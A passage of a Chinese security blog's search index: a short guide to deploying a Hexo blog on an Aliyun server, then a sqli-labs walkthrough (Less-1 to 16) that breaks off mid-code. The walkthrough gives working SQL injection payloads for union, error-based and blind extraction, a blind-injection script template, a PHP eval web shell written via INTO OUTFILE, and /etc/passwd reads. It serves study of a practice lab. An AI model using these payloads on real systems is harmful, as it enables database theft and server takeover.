参考：https://xz.aliyun.com/t/253https://hatboy.github.io/2018/08/28/MySQL报错注入/","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.moonback.xyz/tags/web/"},{"name":"ctf","slug":"ctf","permalink":"http://www.moonback.xyz/tags/ctf/"},{"name":"sql注入","slug":"sql注入","permalink":"http://www.moonback.xyz/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"hexo博客部署到阿里云","slug":"hexo-deploy-aliyun","date":"2019-10-19T08:37:52.000Z","updated":"2021-01-08T12:36:36.418Z","comments":true,"path":"2019/10/19/hexo-deploy-aliyun/","link":"","permalink":"http://www.moonback.xyz/2019/10/19/hexo-deploy-aliyun/","excerpt":"本篇博客介绍了如何将hexo博客部署到自己的服务器上，github实在是太慢了2333333……","text":"本篇博客介绍了如何将hexo博客部署到自己的服务器上，github实在是太慢了2333333…… 服务器安装必要环境安装git apt-get install git 安装nginx(宝塔一键安装) apt-get install nginx 本地环境配置就不介绍了 配置ssh,仓库,网站根目录添加用户 useradd git //添加git用户 passwd git //为git用户设个密码 配置ssh cd /home 如果没有git文件夹创建一个 mkdir /home/git 有的话跳过 su git //切换git用户 mkdir /home/git/.ssh touch /home/git/.ssh/authorized_keys vi /home/git/.ssh/authorized_keys 里面内容填本机里得对应用户目录下的.ssh/id_rsa.pub的内容 配置完可以ssh登陆一下 配置仓库 可以在/home/git/下新建一个blog.git文件夹，用于建立git仓库 git init --bare blog.git 建立钩子(本地部署到服务器会执行) vi ~/blog.git/hooks/post-receive 填入以下内容，work-tree是网站目录，git-dir是git仓库目录 git --work-tree=/home/git/hexo --git-dir=/home/git/blog.git checkout -f 建立hexo文件夹 mkdir /home/git/hexo 将git文件夹所有者更改为git用户，并将用户目录权限改为775，即允许git用户写入 12chown -R git:git git &#x2F;&#x2F;权限问题可能会是报错的主要原因chmod -R git 775 配置网站根目录 nginx -t //查看nginx配置文件位置 cat /www/server/nginx/conf/nginx.conf 没有发现有和网站相关的，但是发现了包含了文件 cd /www/server/panel/vhost/nginx/ ls 发现都是网站的配置文件，我用宝塔一键创建的网站(不知道为啥源码不能放在/www/wwwroot下)，所以里面有网站.conf 12345678server&#123; listen 80; listen [::]:80; server_name 你的服务器地址; index index.php index.html index.htm default.php default.htm default.html; root &#x2F;home&#x2F;git&#x2F;hexo; .... 宝塔可以一键修改目录 部署更改本地_config.yml文件 1234deploy: type: git repo: aliyun: git@你的服务器地址:&#x2F;home&#x2F;git&#x2F;blog.git,master 然后 hexo g hexo d 还要手动运行一下之前设置那个钩子，用宝塔创建可能会生成.user.ini文件，可能会干扰，建议删除 就可以部署到/home/git/hexo文件夹里了 ​","categories":[],"tags":[{"name":"博客","slug":"博客","permalink":"http://www.moonback.xyz/tags/%E5%8D%9A%E5%AE%A2/"},{"name":"折腾","slug":"折腾","permalink":"http://www.moonback.xyz/tags/%E6%8A%98%E8%85%BE/"},{"name":"hexo","slug":"hexo","permalink":"http://www.moonback.xyz/tags/hexo/"}]},{"title":"sqli-labs通关手册","slug":"sqli-labs-wp","date":"2019-10-17T05:46:42.000Z","updated":"2020-05-13T16:16:20.894Z","comments":true,"path":"2019/10/17/sqli-labs-wp/","link":"","permalink":"http://www.moonback.xyz/2019/10/17/sqli-labs-wp/","excerpt":"本篇博客介绍了sqli-labs通关教程！持续更新中！","text":"本篇博客介绍了sqli-labs通关教程！持续更新中！ Less-1对于sql显错注入首先应该想到的时后端sql语句的格式 接下来的Less-1~Less-4都是用联合查询的方式 先测试下正常回显的情况吧 ?id=1 发现正常回显 想办法报错 ?id=1%27 发现回显这 分析一下 &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; 左右两端的&#39;&#39;代表里面的内容为字符串，&#39;1&#39;&#39;相当于&#39;$id&#39; 而后台的sql语句为 1$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;; 正如回显的错误一致 order by判断列数 ?id=1%27%20order%20by%204%23 //回显错误 ?id=1%27%20order%20by%203%23 //回显正常 证明代入查询的字段共3列 判断回显位： ?id=-1%27%20union%20select%201,2,3%23 //回显位为2，3 爆数据库： ?id=-1%27%20union%20select%201,group_concat(schema_name),3%20from%20information_schema.schemata%23 爆表： ?id=-1%27%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=%27security%27%23 或 ?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23 爆字段： ?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;%23 爆内容： ?id=-1&#39; union select 1,group_concat(id,0x23,username,0x23,password),3 from security.users%23 爆数据库： 1?id=1&#x27; and extractvalue(1,concat(0x7e,(database())))%23 爆表： 1?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))%23 爆字段： 1?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)))%23 爆内容： 1?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(id,0x23,username,0x23,password) from security.users)))%23 关键代码1234567891011121314151617$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row)&#123; echo &quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;; echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;]; echo &quot;&lt;br&gt;&quot;; echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;]; echo &quot;&lt;/font&gt;&quot;;&#125;else &#123; echo &#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;; print_r(mysql_error()); echo &quot;&lt;/font&gt;&quot;; &#125; Less-2题目同样可以用报错注入的方式 延续第一题的思路，想让报错 ?id=1&#39; 分析一下 &#39;&#39; LIMIT 0,1&#39; 好像$id没有&#39;之类的 后台sql语句 1$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1&quot;; 果然没有 order by判断列数 ?id=1 order by 3%23 发现还是3列 爆数据库 ?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata%23 爆表 ?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23 爆字段 ?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;%23 爆内容 ?id=-1 union select 1,group_concat(id,0x23,username,0x23,password),3 from security.users%23 关键代码1234567891011121314151617$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row)&#123;echo &quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;;echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;];echo &quot;&lt;br&gt;&quot;;echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;];echo &quot;&lt;/font&gt;&quot;;&#125;else &#123;echo &#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;;print_r(mysql_error());echo &quot;&lt;/font&gt;&quot;; &#125; Less-3题目同样可以用报错注入的方式 继续让其报错 ?id=1’ 分析以下 &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; 由报错信息可知，后台的sql语句应该带有括号，并且有&#39;,即(&#39;$id&#39;) 看下后台语句 1$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;(&#39;$id&#39;) LIMIT 0,1&quot;; 果然如此 那么接下来还是老规矩了 order by判断列数 ?id=1&#39;) order by 3%23 爆数据库 ?id=-1&#39;) union select 1,group_concat(schema_name),3 from information_schema.schemata%23 爆表 ?id=-1&#39;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23 爆字段 ?id=-1&#39;) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;%23 爆内容 ?id=-1&#39;) union select 1,group_concat(id,0x23,username,0x23,password),3 from security.users%23 关键代码12345678910111213141516171819$id = &#x27;&quot;&#x27; . $id . &#x27;&quot;&#x27;;$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row)&#123;echo &quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;;echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;];echo &quot;&lt;br&gt;&quot;;echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;];echo &quot;&lt;/font&gt;&quot;;&#125;else &#123;echo &#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;;print_r(mysql_error());echo &quot;&lt;/font&gt;&quot;; &#125; Less-4同样，继续这种思路 发现当加上&quot;报错 ?id=1” 分析一下报错 &#39;&quot;1&quot;&quot;) LIMIT 0,1&#39; 后台的sql语句应该为(&quot;$id&quot;) 12$id &#x3D; &#39;&quot;&#39; . $id . &#39;&quot;&#39;;$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;($id) LIMIT 0,1&quot;; 和我们猜的一样 order by判断列数 ?id=1&quot;) order by 3%23 同样是三列 爆数据库 ?id=-1&quot;) union select 1,2,group_concat(schema_name) from information_schema.schemata%23 爆表 ?id=-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23 爆字段 ?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;%23 爆内容 ?id=-1&quot;) union select 1,2,group_concat(id,0x23,username,0x23,password) from security.users%23 关键代码12345678910111213141516171819$id = &#x27;&quot;&#x27; . $id . &#x27;&quot;&#x27;;$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); if($row) &#123; echo &quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;; echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;]; echo &quot;&lt;br&gt;&quot;; echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;]; echo &quot;&lt;/font&gt;&quot;; &#125; else &#123; echo &#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;; print_r(mysql_error()); echo &quot;&lt;/font&gt;&quot;; &#125; Less-5报错注入 题目考察的是报错注入，第一次我用了盲注😂 思路和Less-1一样 盲注 虽然不是，但是还是要根据报错信息来构造语句 ?id=1&#39; 分析一下报错信息 &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; 好像和Less-1一样，但是现在不回显查询的结果了 这就是盲注，需要写脚本来爆破内容，在这之前先介绍几个函数 if函数 格式：IF(Condition,A,B) 含义：如果Condition成立，则A，否则B substr函数 格式：SUBSTR(string,start,len) 含义：从string的start位开始截取len个字符 mid函数 格式：MID(column_name,start[,length]) 含义：从column_name中start位开始截取length(可选参数)长度 ascii函数 格式：ASCII(char) 含义：将char转化成ascii码 left函数 格式：LEFT ( string, n ) 含义：函数得到字符串左部指定个数的字符，string为要截取的字符串，n为长度。 right函数 格式：RIGHT( string, n ) 含义：函数得到字符串右部指定个数的字符，string为要截取的字符串，n为长度。 length函数 格式：LENGTH(string) 含义：得到string的长度 模板 12345try: r&#x3D;requests.get(url+payload,timeout&#x3D;3) &#x2F;&#x2F;注意要设置设置timeoutexcept requests.exceptions.ReadTimeout as e: &#x2F;&#x2F;超时异常 data+&#x3D;chr(j) break 外面嵌套循环就行 爆数据库 1payload &#x3D; &quot;?id&#x3D;1&#39; and if(ascii(substr(database(),&#123;&#125;,1))&#x3D;&#123;&#125;,sleep(3),1)%23&quot;.format(j, k) 爆表 1payload&#x3D;&quot;?id&#x3D;1&#39; and if(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit &#123;&#125;,1),&#123;&#125;,1))&#x3D;&#123;&#125;,sleep(3),1)%23&quot;.format(k , i, j) 爆字段 1payload&#x3D;&quot;?id&#x3D;1&#39; and if(ascii(substr((select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&quot;&#123;&#125;&quot; limit &#123;&#125;,1),&#123;&#125;,1))&#x3D;&#123;&#125;,sleep(3),1)%23&quot;.format(te,k,i,j) 爆内容 1payload&#x3D;&quot;?id&#x3D;1&#39; and if(ascii(substring((select &#123;&#125; from &#123;&#125;.&#123;&#125; limit &#123;&#125;,1),&#123;&#125;,1))&#x3D;&#123;&#125;,sleep(3),1)%23&quot;.format(co,db,ta,k,i,j) 按照这个payload就可以跑出来，但速度是是真的慢 关键代码1234567891011121314151617181920$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); if($row) &#123; echo &#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;; echo &#x27;You are in...........&#x27;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; &#125; else &#123; echo &#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;; echo &#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;; &#125; Less-6题目同样可以用报错注入的方式 同样可以先让其报错，查看后台sql语法 发现当 ?id=6&quot; 时，会报错出语句 可以看到后台的sql语句为 12$id &#x3D; &#39;&quot;&#39;.$id.&#39;&quot;&#39;;$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1&quot;; 后面的操作和之前就没什么区别了，利用 ?id=1&quot;+注入语句+%23 就可以注入得到结果了 关键代码123456789101112131415161718192021$id = &#x27;&quot;&#x27;.$id.&#x27;&quot;&#x27;;$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row)&#123;echo &#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;; echo &#x27;You are in...........&#x27;;echo &quot;&lt;br&gt;&quot;;echo &quot;&lt;/font&gt;&quot;;&#125;else &#123;echo &#x27;&lt;font size=&quot;3&quot; color= &quot;#FFFF00&quot;&gt;&#x27;;print_r(mysql_error());echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;; echo &#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;; &#125; Less-7盲注这题好像爆不出后台sql语句，但是我们可以多试试常用的测试注入的语句 直接看下发现源码吧，发现 1$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;((&#39;$id&#39;)) LIMIT 0,1&quot;; 同样，利用 ?id=1&#39;))+注入语句+%23 也可以盲注注入了 写文件先看下路径，这个好像报不出来，只能用其他的题目，以Less-1为例 1/Less-1/?id=-1&#x27; union select 1,@@basedir,@@datadir%23 @@basedir是指Mysql的安装目录，@@datadir是指数据库文件的路径，我们需要用web目录，默认/var/www/html,因此我们 1?id=1&#x27;)) union select 1,2,&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27; into outfile &quot;/var/www/html/moonback.php&quot;%23 注意这个写的目录要有权限，并且mysql有写文件权限，我们可以执行 1show variables like &#x27;%secure%&#x27; 在mysql 5.6.34版本以后 secure_file_priv的值默认为NULL。可以通过以下方式修改 修改mysql.ini 文件，在[mysqld] 下添加条目: secure_file_priv = 保存，重启mysql。 123#值为null ，也就是注释掉这个参数或者secure-file-priv&#x3D;null。表示限制mysqld 不允许导入|导出#值为&#x2F;tmp&#x2F; ，即secure-file-priv&#x3D;&quot;&#x2F;tmp&#x2F;&quot; 表示限制mysqld 的导入|导出只能发生在&#x2F;tmp&#x2F;目录下#没有具体值时，即secure-file-priv&#x3D; 表示不对mysqld 的导入|导出做限制 读文件我们也可以读文件 123create table user(cmd text);insert into user(cmd) values (load_file(&#x27;/etc/passwd&#x27;));select * from user; 也可以用 12load data infile &#x27;/etc/passwd&#x27; into table user;load data local infile &#x27;/etc/passwd&#x27; into table test.test fields terminated by &#x27;\\n&#x27;; 关键代码1234567891011121314151617$sql=&quot;SELECT * FROM users WHERE id=((&#x27;$id&#x27;)) LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row)&#123;echo &#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;; echo &#x27;You are in.... Use outfile......&#x27;;echo &quot;&lt;br&gt;&quot;;echo &quot;&lt;/font&gt;&quot;;&#125;else &#123;echo &#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;;echo &#x27;You have an error in your SQL syntax&#x27;;echo &quot;&lt;/font&gt;&quot;; &#125; Less-8题目考察的是bool盲注，当然也可用时间盲注，能用bool尽量用，速度比较快 12?id=1&#x27; and if(0,1,0)%23?id=1&#x27; and if(1,1,0)%23 两个url返回的结果不一样，因此我们可以在if的第一个参数注入 关键代码123456789101112$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row)&#123; echo &#x27;You are in...........&#x27;;&#125;else &#123; echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;; echo &#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;; &#125; Less-9题目考察的是时间盲注 12?id=1&#x27; and if(0,sleep(3),0)%23?id=1&#x27; and if(1,sleep(3),0)%23 和Less-8差不多的payload，这题不能用bool盲注的原因是两种请求返回的结果一样，无法根据页面内容判断是否sql语句是否恰好满足条件 关键代码1234567891011$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row)&#123; echo &#x27;You are in...........&#x27;;&#125;else &#123; echo &#x27;You are in...........&#x27;; &#125; Less-10还是时间盲注，只不过需要用&quot;闭合 关键代码12345678910111213141516171819$id = &#x27;&quot;&#x27;.$id.&#x27;&quot;&#x27;;$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row)&#123;echo &#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;; echo &#x27;You are in...........&#x27;;echo &quot;&lt;br&gt;&quot;;echo &quot;&lt;/font&gt;&quot;;&#125;else &#123;echo &#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;;echo &#x27;You are in...........&#x27;;echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;; echo &#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;; &#125; Less-11POST注入，和Less-1差不多，只是接收参数的方式不同，order by判断列数 1POST uname=admin&#x27; order by 2%23&amp;passwd=aaa&amp;submit=Submit 通过响应长度的不同可以判断有两列 联合查询，回显在登陆之后界面上 1POST uname=asdf&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database())%23&amp;passwd=aaa&amp;submit=Submit 接着又是爆字段，爆内容那种了 也可以报错注入 1POST uname=asdf&#x27; and updatexml(1,concat(0x3a,(select user())),1)%23&amp;passwd=aaa&amp;submit=Submit 关键代码1234567891011121314151617181920212223242526272829@$sql=&quot;SELECT username, password FROM users WHERE username=&#x27;$uname&#x27; and password=&#x27;$passwd&#x27; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row)&#123; echo &quot;&lt;br&gt;&quot;; echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;; echo &#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;; echo &quot;&lt;br&gt;&quot;; echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;]; echo &quot;&lt;br&gt;&quot;; echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;]; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;; echo &quot;&lt;/font&gt;&quot;;&#125;else &#123; echo &#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &#x27;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#x27;; echo &quot;&lt;/font&gt;&quot;; &#125; Less-12和Less-11差不多，闭合方式不同而已，加个单或双引号试试，从报错信息就能猜出后台sql语句 123uname&#x3D;aaa&quot;&amp;passwd&#x3D;bbb&amp;submit&#x3D;Submitthe right syntax to use near &#39;bbb&quot;) LIMIT 0,1&#39; at line 1 猜测我们加的&quot;与前面的闭合，本来有的影响后面的 1SELECT username, password FROM users WHERE username=(&quot;aaa&quot;&quot;) and password=(&quot;bbb&quot;) LIMIT 0,1 所以构造 1uname=aaa&quot;) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database())%23&amp;passwd=sad&amp;submit=Submit 接着就和Less-11差不多了 关键代码1234567891011121314151617181920212223242526272829303132$uname=&#x27;&quot;&#x27;.$uname.&#x27;&quot;&#x27;;$passwd=&#x27;&quot;&#x27;.$passwd.&#x27;&quot;&#x27;;@$sql=&quot;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row)&#123;echo &quot;&lt;br&gt;&quot;;echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;;echo &#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;;echo &quot;&lt;br&gt;&quot;;echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;];echo &quot;&lt;br&gt;&quot;;echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;];echo &quot;&lt;br&gt;&quot;;echo &quot;&lt;/font&gt;&quot;;echo &quot;&lt;br&gt;&quot;;echo &quot;&lt;br&gt;&quot;;echo &#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;;echo &quot;&lt;/font&gt;&quot;;&#125;else&#123;echo &#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;;print_r(mysql_error());echo &quot;&lt;/br&gt;&quot;;echo &quot;&lt;/br&gt;&quot;;echo &quot;&lt;/br&gt;&quot;;echo &#x27;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#x27;;echo &quot;&lt;/font&gt;&quot;;&#125; Less-13还是加单双引号让它报错 123uname&#x3D;aaa&#39;&amp;passwd&#x3D;bbb&amp;submit&#x3D;Submit the right syntax to use near &#39;bbb&#39;) LIMIT 0,1&#39; at line 1 猜测我们加的&#39;与前面的闭合，本来有的影响后面的 1SELECT username, password FROM users WHERE username=(&#x27;aaa&#x27;&#x27;) and password=(&#x27;bbb&#x27;) LIMIT 0,1 这个好像没有回显，所以我们只能报错和盲注两种了 先看报错，构造 1uname&#x3D;admin&#39;) and updatexml(1,concat(0x3a,(select user())),1)%23&amp;passwd&#x3D;dsa&amp;submit&#x3D;Submit 再看看盲注，可以用bool盲注,根据长度的不同判断，构造 123uname=admin&#x27;) and substr((select database()),1,1)=&#x27;s&#x27;%23&amp;passwd=dsa&amp;submit=Submit或uname=aaa&#x27;) or substr((select database()),1,1)=&#x27;s&#x27;%23&amp;passwd=bbb&amp;submit=Submit 注意如果uname用admin,即表里面存在的值中间就不能用or，后面的会不执行，并且sleep(3)执行之后返回0 如果前面的是0，我们再试下 但是我发现报错注入好像没这个限制 关键代码12345678910111213141516171819202122232425@$sql=&quot;SELECT username, password FROM users WHERE username=(&#x27;$uname&#x27;) and password=(&#x27;$passwd&#x27;) LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row)&#123;echo &quot;&lt;br&gt;&quot;;echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;;echo &#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;;echo &quot;&lt;br&gt;&quot;;echo &quot;&lt;/font&gt;&quot;;echo &quot;&lt;br&gt;&quot;;echo &quot;&lt;br&gt;&quot;;echo &#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;;echo &quot;&lt;/font&gt;&quot;;&#125;else&#123;echo &#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;;print_r(mysql_error());echo &quot;&lt;/br&gt;&quot;;echo &quot;&lt;/br&gt;&quot;;echo &quot;&lt;/br&gt;&quot;;echo &#x27;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#x27;;echo &quot;&lt;/font&gt;&quot;;&#125; Less-14加双引号报错 123uname&#x3D;aaa&quot;&amp;passwd&#x3D;bbb&amp;submit&#x3D;Submitthe right syntax to use near &#39;bbb&quot; LIMIT 0,1&#39; at line 1 猜测后台sql语句 1SELECT username, password FROM users WHERE username=&quot;aaa&quot;&quot; and password=&quot;bbb&quot; LIMIT 0,1 尝试可以报错注入 1uname=aaa&quot; and updatexml(1,concat(0x3a,(select user())),1)%23&amp;passwd=bbb&amp;submit=Submit 尝试布尔盲注 1uname=aaa&quot; or substr((select database()),1,1)=&#x27;s&#x27;%23&amp;passwd=bbb&amp;submit=Submit 关键代码123456789101112131415161718192021222324252627$uname=&#x27;&quot;&#x27;.$uname.&#x27;&quot;&#x27;;$passwd=&#x27;&quot;&#x27;.$passwd.&#x27;&quot;&#x27;;@$sql=&quot;SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row)&#123;echo &quot;&lt;br&gt;&quot;;echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;;echo &#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;;echo &quot;&lt;br&gt;&quot;;echo &quot;&lt;/font&gt;&quot;;echo &quot;&lt;br&gt;&quot;;echo &quot;&lt;br&gt;&quot;;echo &#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;;echo &quot;&lt;/font&gt;&quot;;&#125;else&#123;echo &#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;;print_r(mysql_error());echo &quot;&lt;/br&gt;&quot;;echo &quot;&lt;/br&gt;&quot;;echo &quot;&lt;/br&gt;&quot;;echo &#x27;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#x27;;echo &quot;&lt;/font&gt;&quot;;&#125; Less-15没有回显，考虑盲注和报错 布尔盲注 1uname&#x3D;aaa&#39; or substr((select database()),1,1)&#x3D;&#39;s&#39;%23&amp;passwd&#x3D;bbb&amp;submit&#x3D;Submit 也可以时间盲注 1uname&#x3D;asa&#39; or if((substr((select database()),1,1))&#x3D;&#39;s&#39;,sleep(3),0)%23&amp;passwd&#x3D;dsa&amp;submit&#x3D;Submit 报错注入用不了了，发现print_r(mysql_error());删掉了，这样的话sql语句错误也爆不来了 关键代码123456789101112131415161718192021222324252627@$sql=&quot;SELECT username, password FROM users WHERE username=&#x27;$uname&#x27; and password=&#x27;$passwd&#x27; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row)&#123;echo &quot;&lt;br&gt;&quot;;echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;;echo &#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;;echo &quot;&lt;br&gt;&quot;;echo &quot;&lt;br&gt;&quot;;echo &quot;&lt;br&gt;&quot;;echo &quot;&lt;/font&gt;&quot;;echo &quot;&lt;br&gt;&quot;;echo &quot;&lt;br&gt;&quot;;echo &#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;;echo &quot;&lt;/font&gt;&quot;;&#125;else&#123;echo &#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;;echo &quot;&lt;/br&gt;&quot;;echo &quot;&lt;/br&gt;&quot;;echo &quot;&lt;/br&gt;&quot;;echo &#x27;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#x27;;echo &quot;&lt;/font&gt;&quot;;&#125; Less-16sql错误爆不出来只能fuzz，最终得到 布尔盲注： 1uname&#x3D;aaa&quot;) or substr((select database()),1,1)&#x3D;&#39;s&#39;%23&amp;passwd&#x3D;bbb&amp;submit&#x3D;Submit 时间盲注： 1uname&#x3D;aaa&quot;) or if((substr((select database()),1,1))&#x3D;&#39;s&#39;,sleep(3),0)%23&amp;passwd&#x3D;bbb&amp;submit&#x3D;Submit 关键代码12345678910111213141516171819202122232425262728293031&lt;？php$uname=&#x27;&quot;&#x27;.$uname.&#x27;&quot;&#x27;;$passwd=&#x27;&quot;&#x27;.$passwd.&#x27;&quot;&#x27;;@$sql=&quot;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row)&#123; echo &quot;&lt;br&gt;&quot;; echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;; echo &#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &#x27;&lt;img src=&quot;../images/flag.jpg&quot; 